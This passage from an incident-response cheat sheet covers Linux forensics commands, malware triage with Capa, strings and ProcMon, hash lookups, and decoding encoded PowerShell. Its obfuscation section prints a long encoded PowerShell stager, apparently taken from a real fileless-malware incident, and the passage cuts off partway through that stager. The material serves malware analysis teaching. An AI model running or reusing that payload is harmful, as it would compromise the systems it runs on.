#you don't always need to the -property * bit. But if you find it isn't printing as you want, try again.
| ft -autosize -wrap 
```

Isn't this much better now?

![image](https://user-images.githubusercontent.com/44196051/120917736-bc3f4300-c6a8-11eb-955e-f876d2e1dd8e.png)

---

# Linux
This section is a bit dry, forgive me. My Bash DFIR tends to be a lot more spontaneous and therefore I don't write them down as much as I do the Pwsh one-liners

## Bash History

<details>
    <summary>section contents</summary>
  
  + [Add add timestamps to `.bash_history`](#add-add-timestamps-to--bash-history-)

</details>

Checkout the SANS DFIR talk by Half Pomeraz called [You don't know jack about .bash_history](https://www.youtube.com/watch?v=wv1xqOV2RyE). It's a terrifying insight into how weak bash history really is by default

#### Add add timestamps to `.bash_history`
Via .bashrc
```bash
nano ~/.bashrc
#at the bottom
export HISTTIMEFORMAT='%d/%m/%y %T '
#expand bash history size too

#save and exit
source ~/.bashrc
```
Or by /etc/profile
```bash
nano /etc/profile
export HISTTIMEFORMAT='%d/%m/%y %T '

#save and exit
source /etc/profile
```

![image](https://user-images.githubusercontent.com/44196051/119986667-0abf5400-bfbc-11eb-98cf-17d68042250d.png)

Then run the `history` command to see your timestamped bash history

![image](https://user-images.githubusercontent.com/44196051/119987113-9507b800-bfbc-11eb-8033-064c37f5fe26.png)

---

## Grep and Ack

<details>
    <summary>section contents</summary>

  + [Grep Regex extract IPs](#grep-regex-extract-ipv4)
  + [Use Ack to highlight](#use-ack-to-highlight)
 
</details>

### Grep Regex extract IPs

IPv4
```bash
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt | sort | uniq 
```

IPv6
```bash
egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])) file.txt'
```

### Use Ack to highlight
One thing I really like about Ack is that it can highlight words easily, which is great for screenshots and reporting. So take the above example, let's say we're looking for two specific IP, we can have ack filter and highlight those

[Ack](https://linux.die.net/man/1/ack) is like Grep's younger, more refined brother. Has some of greps' flags as default, and just makes life a bit easier.

```bash
#install ack if you need to: sudo apt-get install ack
ack -i '127.0.0.1|1.1.1.1' --passthru file.txt
```
![image](https://user-images.githubusercontent.com/44196051/120458382-24331800-c38f-11eb-9527-4c6682be2f5c.png)

---

## Processes and Networks

<details>
    <summary>section contents</summary>

  + [Track parent-child processes easier](#track-parent-child-processes-easier)
  + [Get a quick overview of network activity](#get-a-quick-overview-of-network-activity)
  
</details>

### Track parent-child processes easier
```bash
ps -aux --forest
```
![image](https://user-images.githubusercontent.com/44196051/120000069-54af3680-bfca-11eb-91a8-221562914878.png)

### Get a quick overview of network activity
```bash
netstat -plunt
#if you don't have netstat, try ss
ss -plunt
```
![image](https://user-images.githubusercontent.com/44196051/120000196-79a3a980-bfca-11eb-89ed-bbc87b4ca0bc.png)

---

## Files

<details>
    <summary>section contents</summary>

  + [Recursively look for particular file types, and once you find the files get their hashes](#recursively-look-for-particular-file-types--and-once-you-find-the-files-get-their-hashes-1)
  + [Tree](#tree)
    - [Tree and show the users who own the files and directories](#tree-and-show-the-users-who-own-the-files-and-directories)
  + [Get information about a file](#get-information-about-a-file)
  + [Files and Dates](#files-and-dates)
    - [This one will print the files and their corresponding timestamp](#this-one-will-print-the-files-and-their-corresponding-timestamp)
    - [Show all files created between two dates](#show-all-files-created-between-two-dates)
  + [Compare Files](#compare-files)

</details>


### Recursively look for particular file types, and once you find the files get their hashes
Here's the bash alternative
```bash
find . type f -exec sha256sum {} \; 2> /dev/null | grep -Ei '.asp|.js' | sort
```
![image](https://user-images.githubusercontent.com/44196051/120331789-0cec2000-c2e6-11eb-9617-129c9948666b.png)

### Tree
`Tree` is an amazing command. Please bask in its glory. It will recursively list out folders and filders in their parent-child relationship.....or tree-branch relationship I suppose?

```bash
#install sudo apt-get install tree
tree 
```

![image](https://user-images.githubusercontent.com/44196051/120555193-9f79e580-c3f2-11eb-99e4-bf23930e2e54.png)

But WAIT! There's more!

#### Tree and show the users who own the files and directories
```bash
tree -u
#stack this with a grep to find a particular user you're looking for
tree -u | grep 'root'
```
![image](https://user-images.githubusercontent.com/44196051/120555360-de0fa000-c3f2-11eb-8670-fdc522d03418.png)
![image](https://user-images.githubusercontent.com/44196051/120555562-27f88600-c3f3-11eb-891a-98bf39b5cd71.png)

If you find it a bit long and confusing to track which file belongs to what directory, this flag on tree will print the fullpath
```bash
tree -F
# pipe with | grep 'reports' to highlight a directory or file you are looking for
```
![image](https://user-images.githubusercontent.com/44196051/120661487-3c369480-c480-11eb-8103-fda15e2cbec4.png)

### Get information about a file
`stat` is a great command to get lots of information about a file
 ```bash
stat file.txt
```
![image](https://user-images.githubusercontent.com/44196051/120663875-57a29f00-c482-11eb-8ce9-b4738ce6017a.png)

### Files and Dates
Be careful with this, as timestamps can be manipulated and can't be trusted during an IR

#### This one will print the files and their corresponding timestamp
```bash
find . -printf "%T+ %p\n"
```
![image](https://user-images.githubusercontent.com/44196051/120664233-acdeb080-c482-11eb-8a85-922965bd575e.png)

#### Show all files created between two dates
I've got to be honest with you, this is one of my favourite commands. The level of granularity you can get is crazy. You can find files that have changed state by the MINUTE if you really wanted.

```bash
find -newerct "01 Jun 2021 18:30:00" ! -newerct "03 Jun 2021 19:00:00" -ls | sort
```
![image](https://user-images.githubusercontent.com/44196051/120664969-460dc700-c483-11eb-8c1b-a2223549a97f.png)

### Compare Files

`vimdiff` is my favourite way to compare two files
```bash
vimdiff file1.txt file2.txt
```

The colours highlight differences between the two. When you're done, use vim's method of exiting on both files: `:q!`. Do this twice

![image](https://user-images.githubusercontent.com/44196051/123003853-b71e0b80-d3ab-11eb-8b9e-7e25f8f7a695.png)

`diff` is the lamer, tamer version of `vimdiff`. However it does have some flags for quick analysis:

```bash
#are these files different yes or no?
diff -q net.txt net2.txt

#quickly show minimal differences
diff -d net.txt net2.txt
```
![image](https://user-images.githubusercontent.com/44196051/123004215-37447100-d3ac-11eb-80e9-7f19168e022a.png)


---


## Bash Tips

<details>
    <summary>section contents</summary>

  + [Fixing Mistakes](#fixing-mistakes)
    - [Forget to run as sudo?](#forget-to-run-as-sudo-)
    - [Typos in a big old one liner?](#typos-in-a-big-old-one-liner-)
    - [Re-run a command in History](#re-run-a-command-in-history)

</details>

### Fixing Mistakes
We all make mistakes, don't worry. Bash forgives you

#### Forget to run as sudo?
We've all done it mate. Luckily, `!!` has your back. The exclamation mark is a history related bash thing. 

Using two exclamations, we can return our previous command. By prefixing `sudo` we are bringing our command back but running it as sudo

```bash
#for testing, fuck up a command that needed sudo but you forgot
cat /etc/shadow
# fix it!
sudo !!
```
![image](https://user-images.githubusercontent.com/44196051/120555899-abb27280-c3f3-11eb-8807-f65b74373ad9.png)

#### Typos in a big old one liner?
The `fc` command is interesting. It gets what was just run in terminal, and puts it in a text editor environment. You can the ammend whatever mistakes you may have made. Then if you save and exit, it will execute your newly ammended command

```bash
##messed up command
cat /etc/prozile
#fix it
fc
#then save and exit
```
![image](https://user-images.githubusercontent.com/44196051/120556440-69d5fc00-c3f4-11eb-98ba-ca1c6ac9d8b5.png)
![image](https://user-images.githubusercontent.com/44196051/120556467-70647380-c3f4-11eb-98a1-4f0dd2fef693.png)

#### Re-run a command in History
If you had a beautiful command you ran ages ago, but can't remember it, you can utilise `history`. But don't copy and paste like a chump. 

Instead, utilise exclamation marks and the corresponding number entry for your command in the history file. This is highlighted in red below

```bash
#bring up your History
history
#pick a command you want to re-run.
# now put one exclamation mark, and the corresponding number for the command you want
!12
```
![image](https://user-images.githubusercontent.com/44196051/120556698-c3d6c180-c3f4-11eb-967d-c5ff873ebb56.png)

---

# Malware

I'd reccomend [REMnux](https://docs.remnux.org/), a Linux distro dedicated to malware analysis. If you don't fancy downloading the VM, then maybe just keep an eye on the [Docs](https://docs.remnux.org/discover-the-tools/examine+static+properties/general) as they have some great malware analysis tools in their roster. 

## Rapid Malware Analaysis

<details>
    <summary>section contents</summary>

  + [Capa](#capa)
  + [Strings](#strings)

</details>

### Capa
[Capa](https://github.com/fireeye/capa) is a great tool to quickly examine wtf a binary does. This tool is great, it previously helped me identify a keylogger that was pretending to be an update.exe for a program

Usage
```bash
./capa malware.exe > malware.txt
# I tend to do normal run and then verbose
./capa -vv malware.exe >> malware.txt
cat malware.txt
```
![image](https://user-images.githubusercontent.com/44196051/119991809-c1720300-bfc1-11eb-8409-6523a9b0019b.png)

Example of Capa output for the keylogger
![image](https://user-images.githubusercontent.com/44196051/119991358-44df2480-bfc1-11eb-9e6f-23ff445a4900.png)

### Strings
Honestly, when you're pressed for time don't knock `strings`. It's helped me out when I'm under pressure and don't have time to go and disassemble a compiled binary.

Strings is great as it can sometimes reveal what a binary is doing and give you a hint what to expect - for example, it may include a hardcoded malicious IP.

![image](https://user-images.githubusercontent.com/44196051/120565891-f2a96380-c405-11eb-925c-2471fa3673fe.png)

---

## Process Monitor

<details>
    <summary>section contents</summary>

  + [Process Monitor: Keylogger Example](#process-monitor--keylogger-example)
  
</details>


[ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is a great tool to figure out what a potentially malicious binary is doing on an endpoint.

There are plenty of alternatives to monitor the child processes that a parent spawns, like [any.run](https://any.run/). But I'd like to focus on the free tools to be honest.

### Process Monitor: Keylogger Example
Let's go through a small investigation together, focusing on a real life keylogger found in an incident

#### Clearing and Filtering
When I get started with ProcMon, I have a bit of a habit. I stop capture, clear the hits, and then begin capture again. The screenshot details this as steps 1, 2, and 3. 

![2021-06-03_10-12](https://user-images.githubusercontent.com/44196051/120619727-2d39ed00-c454-11eb-80d3-4547928a1db6.png)

I then like to go to filter by process tree, and see what processes are running

![2021-06-03_10-20](https://user-images.githubusercontent.com/44196051/120620977-62930a80-c455-11eb-85e4-3062fbaadee4.png)

#### Process tree

When we look at the process tree, we can see something called Keylogger.exe is running!

![2021-06-03_10-23](https://user-images.githubusercontent.com/44196051/120621364-b7368580-c455-11eb-8af9-b2577e0113ce.png)

Right-click, and add the parent-child processes to the filter, so we can investigate what's going on

![2021-06-03_10-24](https://user-images.githubusercontent.com/44196051/120621605-eea53200-c455-11eb-9769-96e489708280.png)

#### Honing in on a child-process

ProcMon says that keylogger.exe writes something to a particular file....

![2021-06-03_10-27](https://user-images.githubusercontent.com/44196051/120621914-42178000-c456-11eb-8adf-a43f4249ed08.png)

You can right click and see the properties

![2021-06-03_10-30](https://user-images.githubusercontent.com/44196051/120622483-c2d67c00-c456-11eb-8746-ee8bb9a65bf6.png)

#### Zero in on malice

And if we go to that particular file, we can see the keylogger was outputting our keystrokes to the policy.vpol file

![2021-06-03_10-29](https://user-images.githubusercontent.com/44196051/120622218-8571ee80-c456-11eb-9b23-ed31ef4ec04e.png)

That's that then, ProcMon helped us figure out what a suspicious binary was up to!

---

## Hash Check Malware

<details>
    <summary>section contents</summary>

  + [Collect the hash](#collect-the-hash)
  + [Check the hash](#check-the-hash)
    - [Virus Total](#virus-total)
    - [Malware Bazaar](#malware-bazaar)
    - [Winbindex](#winbindex)

</details>

#### Word of Warning
Changing the hash of a file is easily done. So don't rely on this method. You could very well check the hash on virus total and it says 'not malicious', when in fact it is recently compiled by the adversary and therefore the hash is not a known-bad

And BTW, do your best NOT to upload the binary to VT or the like, the straight away. Adversaries wait to see if their malware is uploaded to such blue team websites, as it gives them an indication they have been burned. This isn't to say DON'T ever share the malware. Of course share with the community....but wait unitl you have stopped their campaign in your environment

### Collect the hash
In Windows
```powershell
get-filehash file.txt
# optionally pipe to |fl or | ft
```

In Linux
```bash
sha256sum file.txt
```
![2021-06-03_10-46](https://user-images.githubusercontent.com/44196051/120624759-e7335800-c458-11eb-9f67-4bfb1238f5f7.png)
![2021-06-03_10-54](https://user-images.githubusercontent.com/44196051/120625949-139ba400-c45a-11eb-997d-d6e33917efb5.png)


## Check the hash

### Virus Total
One option is to compare the hash on [Virus Total](https://www.virustotal.com/gui/home/search)

![image](https://user-images.githubusercontent.com/44196051/120631699-100b1b80-c460-11eb-87e7-bebe116b038a.png)

Sometimes it's scary how many vendors' products don't show flag malware as malicious....

![image](https://user-images.githubusercontent.com/44196051/120631921-5496b700-c460-11eb-8f02-3d276a74ed16.png)

The details tab can often be enlightening too

![image](https://user-images.githubusercontent.com/44196051/120632008-6d06d180-c460-11eb-9c19-758ef3bd9904.png)

### Malware Bazaar
[Malware Bazaar](https://bazaar.abuse.ch/) is a great alternative. It has more stuff than VT, but is a bit more difficult to use

You'll need to prefix what you are searching with on Malware Bazaar. So, in our instance we have a `sha256` hash and need to explicitly search that.

![image](https://user-images.githubusercontent.com/44196051/120632396-d4bd1c80-c460-11eb-94c3-af0f975d8b1f.png)

Notice how much Malware Bazaar offers. You can go and get malware samples from here and download it yourself. 

![image](https://user-images.githubusercontent.com/44196051/120632712-282f6a80-c461-11eb-8d84-7727d05df187.png)

Sometimes, Malware Bazaar offers insight into the malware is delivered too

![image](https://user-images.githubusercontent.com/44196051/120632964-7cd2e580-c461-11eb-8a37-1dcf3506f90e.png)

### Winbindex

[Winbindex](https://winbindex.m417z.com) is awesome. The info behind the site can be read [here](https://m417z.com/Introducing-Winbindex-the-Windows-Binaries-Index/). But in essence, it's a repo of official Windows binaries and their hashes.

We've already discussed it about [Drivers](#driver-queries) and [DLLs](#verify), so I won't go into too much detail. This won't give you an insight into malware, but it will return what the details of an official binary should be.

This is powerfull, as it allows us to know what known-goods should look like and have. 

![image](https://user-images.githubusercontent.com/44196051/121807829-b8359700-cc4d-11eb-84c4-80a6ae927dc8.png)

If we click on _Extras_ we get insightful information about the legitimate filepath of a file, its timestamp, and more!

![image](https://user-images.githubusercontent.com/44196051/121807894-fb900580-cc4d-11eb-8ce9-9ca176626c54.png)

---

## Decoding Powershell

<details>
    <summary>section contents</summary>

  + [Straight Forward Ocassions](#straight-forward-ocassions)
  + [Obfuscation](#Obfuscation)

</details>

### Straight Forward Ocassions

Let's say you see encoded pwsh, and you want to quickly tell if it's sus or not. We're going to leverage our good friend [CyberChef](https://gchq.github.io/CyberChef)


#### Example String

We're going to utilise this example string
```
powershell -ExecutionPolicy Unrestricted -encodedCommand IABnAGUAdAAtAGkAdABlAG0AcAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcACoAIgAgACAAfAAgAD8AIABJAG0AYQBnAGUAUABhAHQAaAAgAC0AbABpAGsAZQAgACIAKgBkAHIAaQB2AGUAcgBzACoAIgA=	
```

#### Setup CyberChef

Through experience, we can eventually keep two things in mind about decoding powershell: the first is that it's from base64 ; the second is that the text is a very specific UTF (16 little endian). If we keep these two things in mind, we're off to a good start.

We can then input those options in Cyberchef . The order we stack these are important! 

![image](https://user-images.githubusercontent.com/44196051/121333852-12162400-c911-11eb-92c4-11fec95b2a72.png)
<https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Decode_text('UTF-16LE%20(1200)')>

#### Decoding
In theory, now we have set up cyberchef it should be as easy as just copying the encoded line in right?

![image](https://user-images.githubusercontent.com/44196051/121334957-10992b80-c912-11eb-85d4-3776d5f62195.png)


Well. Nearly. 
For reasons (?) we get chinese looking characters. This is because we have included plaintext human-readable in this, so the various CyberChef options get confused.

So get rid of the human readable!

![image](https://user-images.githubusercontent.com/44196051/121335190-4807d800-c912-11eb-8092-a166c99b8bdf.png)

And now if we send it through, we get the decoded command!

![image](https://user-images.githubusercontent.com/44196051/121335283-5a821180-c912-11eb-9c7c-6be313878e48.png)


### Obfuscation

I had an instance where 'fileless malware' appeared on a user's endpoint. Whilst I won't take us all the way through that investigation, I'll focus on how we can unobfuscate the malware.

We have two guides of help: 
* [Reversing Malware](https://haxys.net/tutorials/reversing/powershell2/0-reverse/#:~:text=func_get_proc_address&text=This%20memory%20address%20is%20returned,declared%20in%20the%20function%20call)
* [Using cyberchef](https://medium.com/mii-cybersec/malicious-powershell-deobfuscation-using-cyberchef-dfb9faff29f)


#### Example string

Don't ....don't run this.

```powershell
#powershell, -nop, -w, hidden, -encodedcommand, JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAWABXAFcALwBpAFMAaABaACsARAByAC8AQwBEADUARQBBAE4AZQBFAEMASgBsAHUAUABJAHIAWABCAE4AdABnAEIAQgB6AEIANwBiAGgAUwBWAHEAdwByAEgAeABMAHYATAAyAE8AWgAyAC8ALwBjADUATgBwAEMAYgBuAGsANQBtAFcAcABvAFoASgBJAHQAYQB6AHYAcQBkAHgAYwBjADYAWgBSAGMANgBDAHkAMwBNAGgAaAA2AGgAMwBNAFcAYwBoAHAASABsAHUAVgB5AHIAVgBEAG8AWABQAFkAVgB4AGQAOQB5ADMAYwBtAGsAVAB1ADUAagBsAHgALwBuAGkAMgBhAFQAcwAyAFEAOAA5AC8ASQB3AEkAQwBXAGsAVQBjAFgAKwBWAHoAawBZAG8AUgBBADUAWABPAGQAKwBoADgATgBuAHgAUwBHAHoAVABHAGwAZABzAGMAawBKAEsANABwAEIAVwB6ADgANQBLAFoAOABWAFIANwBFAFoAbwBRADUAOQBkAHgASwB3AGQAZgBYAFkAbwBlAC8ARgBJAEIASQBvAHEAagA0AEwAdgBpADUANgBEAEwAUABmAHAANgA5AGQAdQBIAEkAYgBVAFoAWQBkADkAdgBVAGUAWgBFAEUAWABVAE0AVwB5AEwAUgBwAFUAcQA5ADUAMQBiAHYATgBDAFEAWABqAHcAWQBXADQAbwBaADkAeABkADMALwBsAHoAdgAyAFoANgBCADcAQwBOAFoAMQBrAFgANABCAFIAdwBTAFgASgBMAGYARABUAHkATQBjAGcALwBxAHUAbQA5AGIAcgBGAEwAKwA4ADgAOQB5ADkAZgBHAGkAKwBWAFMAWABnAGgAagBaAFUAYQBXAHMAWgB4AEcAagBUAHAAMwBZAGQAcgBuAEsALwBhAGoAbQBDAHEAZQBaAFQAeQB2AGwAbwBZAFYARABMAC8ASQAyAHIATAA2AHcAWABMADUAVgBuAHgAWABXAGEANABYAHgAdwA0AFAAdAA1AGUAcgBSAE0AOQBOAEgANABNAGYAbgBUAHUAWgBTAEQAegB5AFYATQBpAHgASABnAEkAMQB3AHcATABCAGMANAB4ADUAegBmAFkAOQBQAFQAOQB5ADMATgAyAHMAbQBzAGMAcwBzAGgAOQBZAFYAbAA5AEgAUQA4ADMAVQBhADcAaQB4AE0AbwAzAG8AZgB1AGMAUwBtAEUANwBvAEIAdABuAEkARQA0AFgAUABOAGMAaABXAE0AQwBDAG0ATABRADUAYwA3ADIAUQBKADgATwArACsAVgBWAHMANwBkADIATABaAHIASQBQAGYAeABkACsAVQArAFYAVABTAGEAbgBNAEQAOQBYAGEAYgBLAGUAeQBhAGcARwByAEcAdwBXAGoAdgBtAHgATwAvAEEATQBTAHoAeQA1AGkAQQBPADMAUABuAEYAKwBuAGYASgBWAFkAWABmAEwAdwBsAFcATABmADAAbwBmAFoAQwBxAGgATgByAFUAUgBJAHcAKwBNADgARAAzAFgAYQA2AFcAegBzADQAZQBpAHkAVQBGAGYAeQBvAGoATAA3AEkASwB2AGoAdQB1AFUAZQBPAEcAWQBBAFIAaQBYAHAAagBsADQAWgB5AEcATQBhADAAKwAvAFIAMgBmAGcAOQBvAFQAWgAxAFQANwBWAEYARAB6AHgASABYAGsATwBZAFQAbgBZAE0AYwBkADkAegBqADMATABQAEoAVQBPAHEAdQBXAGoAdABtAFQAbgB6ADgAYgBzAFcAVQBUAEcAdQBiADMAbgAxAGUARABTAEQAZQBXAFMAOABYAE0AUgBZADYARgBUAHcAbABmACsAUwBoAG0AZABHAFAAVABBAG8ALwA2AGkAVQB3AEQATwB5AHYAbAA0AHcAVQBsADQAaABHAGQAYwBnADcAbwA0ADYAOQBzAGsAbQBPAHgATgA5ADcATwB3AFQAZwBCAFEAOQB3AGoAcwBBAHAAUwBvAHYAcQB6AE0AWQBjAFkAVgBzAHEASwBPADYAUQBPADQASABmAFkAUQA1AHEAZQBiADYARABNADYASQBuADYAVwBGAHIAWgBTAFgAdQArAHoAMwBPADUAYQA2AE0AbwBxAG4ARwBqAEcATwBvAGMAMQB6AGkAZABJAHAAdQBTAEcAaQBlADQAawBYAFcAOABFAG0ATABtAEYAYwB2AHkAMwArAFkATwBZADUAdABaAEcARQBYAHMASgBPADYAcAArAGcARwBrAFIAOQBWAGQAegA0AFcASwBpAFQARgBFAEYAMgBDAFkANgBqADcARgBGAHIASgB6AFYARwBwAGMAMwB5AEsAMABrACsAbQBXAGUAVABLAGgALwBDAEUAbQBYAFcAVABiAFUASABJAGcAYQBRAGMAeABnAFoATQBjAEMANQAzAGwATwBSAE8AUwAyAHIALwBtAFIANwBXAHUAVQA2AFkANAB2AGsAMABkAG8AQwA2ADYAawBHAHcAagBFADMAcgBPAHMAYQBLAEsAZABFAE0AbQBKAGUAVgAvAFkALwBhAHAAVABnADUARgBrAFcATgAxAEEAdQBtAGQAMABaAEEAQQB1AHUAMgB4AEcAagBlADMAUQBnAFoAOQByAFYAegA3AEoAZgBIACsATwAvAE4AKwBiAGoARQAvAG0AZABrAE4ANgBUAEcAUQBsAGEASQBRAEgAegBzAFoAeQA4AHUAbABvAE0AVAA1AHkAKwBYAHUARABjAHMAQwB1AFoAQQBCAGEAbgBMAG8ATwBSADAAVQAwAGEAdQAyAFgAcgBTAHgAUwBwAG0ALwBpAFEATQBsAEcAMgA3AEgAVgAyAEYAUAAyAHMAbgA5AG8AQwA5AE4ANABkAG4AQgB3AHcAZQB5AE4AQgBpAG8ARQA3ADgAegBHAFcAQQBwAGYAaABqADEARwArAHAARwBHAGQAKwBJADcAVABpAEoAbABYAGoAYQBhAGYAQgB5AEEAKwBqADIAUQBVAC8AYQBLAEwAcwBIAGIAOQBXAE0AbgBYAGEAVAArAE0AcABPAGcANwBQAG8ATwB1AGgASABvAHIASQBUAGgAWAA0AHIAOABPAFEAcgAwADcAbwA5AHkAagBuAHcAagA0ADIAawBhAFMAdwBWACsAZAByAG8AeQBlADMAKwBQAEoASgB6ACsAcgA2AHkANgA4AGgAQgA5ADkAYQBEADkAUgAvAEsAcgB1AHUAcAB3AEgAZAB6ADUAYgB1AGQAaABMAFMAcABwAEYANwBSADUAUQBBAG4AUABMAHUAaAB5AEUAeQB6ACsALwBrAFgAdgBkAEgAcwB6AFQATgB0AE0ASgBkADgAVABYAGYASgB3AEcAaQBPAFoAVgBYAGIAdAB6AEwAdwBDAGYAegBTACsAZgA2AGsAUQBlAEQAUgBVADcAdQA1ADgASwBiADQATgBnAHIANgB1AGIAKwAwAE0AdwBpAHcAcQA2AHAASwBYADgAMQAwAGYAdAB4AFcATQBpADMAQgBEAGQAWQBJAHcAcgAzAE4AagA5AGIANwBMAEwAZwBCAGYAcQAwAE4AbQBLAFIANgBOAHAAeQAwAHIAMABpAEsAbAAzAEsAQwBsADkAbwBnADYANgArADAASAB1AGcASQA0AG8AWABaADcAbQBzAEQATAB4AFcAMgB5AGwAVQBvADYAagByAFoANgA5AE8AMABxAFQAZgBYADkAZwA0AHQAOABhADIAYgBGAFAAcAAxAGsAaQBaAGsARgBqADIAbwBVADcAYgBpAFIAOABoAHAAWgA1AGwANwBwAFMAdABiAEoAUgAxAGcAbgA4ADIAWAA2AGwAVwBJAHMAcQA0AC8AcwBLAGoAUgAyAGIAQgBjAHIAagBwAFkAbQArAHEAdABCAEcAdQBKAHAAUQAxAGQAbgAyAFEARQA5AE4AcgA5AHEAWABnAFAAZQB0ADMAdQBjAEEAZwArAG8ARQB0ADUAOQBVAHIANQAwAGYAMQBDADIAMgBPACsATQA4AEIAWgBxAEYAaABLAE4AcgBxAC8AcwBrAEQAMgBEAFIAdgB5AGMAQwA1AEsANgBqAFYAeQBYADcAZQB5AGsAMwBSAHgAcwB0ADYAdQBYAEsAMAB0ADgANwBkADcAdQBvAHcAVwBjAHMATAAyAG0ANwBFADMAVwAvAFcARQBlAHgAbABpAHMASABaADgAYwArAFYASwBEADcAaABQAEwARwBOAEIATABMAHoAQQBEAHkAdQBuAHkAUwBOADMASAB1AEQAbABPAGgARgBkADQAdQBBACsAZgBsAGcAdgAvAE4AMwBhAFYAUABvAG8AZQBRAG0ANwArAG4AQgBoAEMATwBxACsAWQAyAG0AdABtAGIAUwBlAGkASQA0AHEAVABWADYAYgB5ADkANQBZAGkANgBlAHkAZgBUADkAdAAzAEgAYgBGAHoAawBxAFQAawB1AEYAZwBMAEsAVQBQAHMANABhADYAMQBGAC8AbAAwAGUAVABGAEYAQQAyADMARQA2AHoATgBJAFIASQBuAHcANQBYAEEAVAArADYAbgBNAHoASwBjAHkANABKAG8ATABMAEUAbwBqAHgAdAA2AFQAOQBBAGEAKwBtAHQAagBMAHEAZQBtAHUARQBoAG4AUwA5AGoAegBzADUAbgBmAHoAKwBVAFgATQB1AEYAOAB0AFUAaQBEADkAWQB1ADMAVwBqAHYATgBGAGgAYQA4ACsAUAA1AGsAagA2AE4AWgBtAEQAZQBYAEcAMQA2ADcAcABPAGwAcQAyAGUAVwAxADIAKwA3AEwAeABGAHcASgAzAG0AeABwAEUAZwBjADUASABRAHUAUABMAHgAUABTAFUAdABtADYAcABhAGIAcgA1AE4ASQB5AGwAaQBRAGcAQwB6ADgAbAByAHYAQgBBAFcAdQB1AEUASgBKAGMAMgBjAG0ANABkAHcAUwBSAGgAdAB4AGUAcABTAHIAcQBPAEIASABmAFkAVwA3AFgAVQBQAGUAMgBRAFAAegBCAHYAWAA4AHMAdgBlAEkARAA1AHgAcgAzAGMANgA1AGcAZwBuADMAWgBhADYAMgBEAFYAVQAxAFAAUgA3AGYAQwBBAG4AYgB0AHkAWgBSAGMAdwBZAGEAVABsAE4ANQBFAHIAZwA0ADIAWAAvAEIAcgB1AFIARwBjAGUARwBLADEAVgB0ADkATwBLAEYASgBUADgAdgArAEoAagBiAHYAWABiAGgANABXADUAaABGAHgAOAB0AGIAZQBRAHgAMwB2AEkANgBRAEUAOABXADQAVwBmAEQARwBpAGIASgBDAG4AawBXAEsAUgA2AGUAYQAxAHMAbABaADIAZgA0AGYAdABRAEkAbABLADAARgBXAEMAUAArAC8AUABCADAARgBnAEUAQwBkAG0AMwAvAEYAaABiAFgAaQBMAHoAVgBZAG0ANwBVAE8ATgBHAGoAMwA0AFIAQgB3AEcANwBoAHIAegBEAEMAMwBFAHkAMAA4AFcASgBNAHUANABsAGoAWQBtAFUARABnACsAeQBrAHIAdQA3AHYASQBOAHQAdgBCAEIAbQBrAGoAUgAvAHoALwArAEQAZwAvADgATABtADMARgB2AFAAUQBvADYARQB6AFMAOQAvAFAAegBMAGwAMgBvACsASwA3AHoAZABQAEoANgBuAFQANgBmAFoANwBtADEALwBZAGEAUQBnAGoAYgAvAE0AKwAxADEAeABzADAAUAB2AHUAdAB4AG4AQQA5AE0AUQBoAGQARQBMAHMAcQBIADcAdwBkAEIAegBlAG0AWABKAFgAaQBnAGYAUgA1AGUAUgBaACsAVQBjAGwAYwByAEgAMAAvAFkAcgBEAFYAMQBxAHcAeQBRAEsAcwArAHEAcAAwAFEAdQAyADcAZQBGADgAMgBQAHAAawA2AG8ASABSADcAegBDAFEAUABjAEUATABiAFEAWgBMAHYAdgBYAGgAcQBzAHEAOQBFAGMASwBFAGQAZgBEAEoAaQBEAGUAYgBZAGkAQQA1AGUAbgBpAGEAeQAwADYARQBYADcAKwB1AHcAYgAzAGEATwB4AEEASAAxAEQAWABaAFMANAAxAHIAcABIAHkAagAwAGMAagAvADIANAAxAHEANgBmAGQAaAA2AFgAcAArAFYAbgBrAFQAVgA4AHMASABzAG4AZQBXAHYATgBkAGsARgA1AHEAcQBSAC8AVABEADIASABYAG8ALwB6AEEAQQBQAHkAbgA5AHoAOQBEAG0ANABCAFUAegAzAFIAdAAwAGgAVQBFAGYANAAxAFUAdABsAGIAKwBWAFMAcwBxAEcAZQAzAGMAZQBXAFgAdgA0AFkAcQBFAEIAZAAxAFAAawBYAHMAUgBRAHkAQwA2ADIAbgBnAEcAZgBOADgAWAA3AHUAbgBLAE8AcQBwAHcAaQBMAGIAbAB6AHgAUAAzAGcATABzAEEAOQBJAGUAS